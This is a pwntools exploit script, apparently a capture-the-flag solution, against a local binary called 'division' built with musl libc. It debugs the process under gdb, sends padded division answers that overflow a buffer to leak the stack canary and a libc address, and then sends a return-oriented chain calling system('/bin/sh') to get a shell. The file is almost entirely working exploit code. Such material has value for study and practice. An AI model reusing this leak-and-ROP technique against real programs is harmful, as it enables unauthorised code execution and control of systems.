#!/bin/python
from pwn import *
exe = ELF('./division')
libc = ELF("./libc.musl-x86_64.so.1")
# ld = ELF("./ld-2.23.so")
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''
#            b*main+73
#            c
           # set $rax=0 
b*input+109
 set *(long int*)0x555555557fa0 = 0x00005555555552f5
 set follow-fork-mode child
           

           ''')
#################exploiting#####################
# while True:
num1 = p.recvuntil(b' / ', drop=True)
num2 = p.recvuntil(b': ', drop=True)
# if b'\n' in num1:
#     num1 = num1.split(b'\n')[1]
#     log.info("num1: "  + str(num1))
result = int(num1) / int(num2)
payload = str(result).encode('utf-8')
payload = payload.ljust(0x18-0x3, b'a') + b'lma'
input()
p.send(payload )
p.recvuntil(b'lma')
leak_canary = u64(p.recv(8))
log.info("leak_canary: " + hex(leak_canary))
p.recv(6)

num1 = p.recvuntil(b' / ', drop=True)
num2 = p.recvuntil(b': ', drop=True)
# if b'\n' in num1:
#     num1 = num1.split(b'\n')[1]
#     log.info("num1: "  + str(num1))
result = int(num1) / int(num2)
payload = str(result).encode('utf-8')
payload = payload.ljust(0x18-0x3+0x40, b'a') + b'lma'
input()
p.send(payload )
p.recvuntil(b'lma')
leak_libc = u64(p.recv(6) + b'\x00\x00')
base_libc = leak_libc - 0x1ca03
bin_sh = base_libc +0x91a62
pop_rdi = base_libc + 0x0000000000015c67
system_libc = base_libc + 0x3f716
# log.info("leak_libc: " + hex(leak_libc))
# log.info("base_libc: " + hex(base_libc))
# log.info("bin_sh: " + hex(bin_sh))
# log.info("pop_rdi: " + hex(pop_rdi))
# log.info("system_libc: " + hex(system_libc))

p.recvuntil(b'\n')

num1 = p.recvuntil(b' / ', drop=True)
num2 = p.recvuntil(b': ', drop=True)
log.info("num1: "  + str(num1))
log.info("num2: "  + str(num2))
# if b'\n' in num1:
#     num1 = num1.split(b'\n')[1]
#     log.info("num1: "  + str(num1))
result = int(num1) / int(num2)
payload = str(result).encode('utf-8')
payload = payload.ljust(0x18, b'a')
payload += p64(leak_canary)
payload += b'a'*8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
input()
p.send(payload )
##############the end###########################
p.interactive()
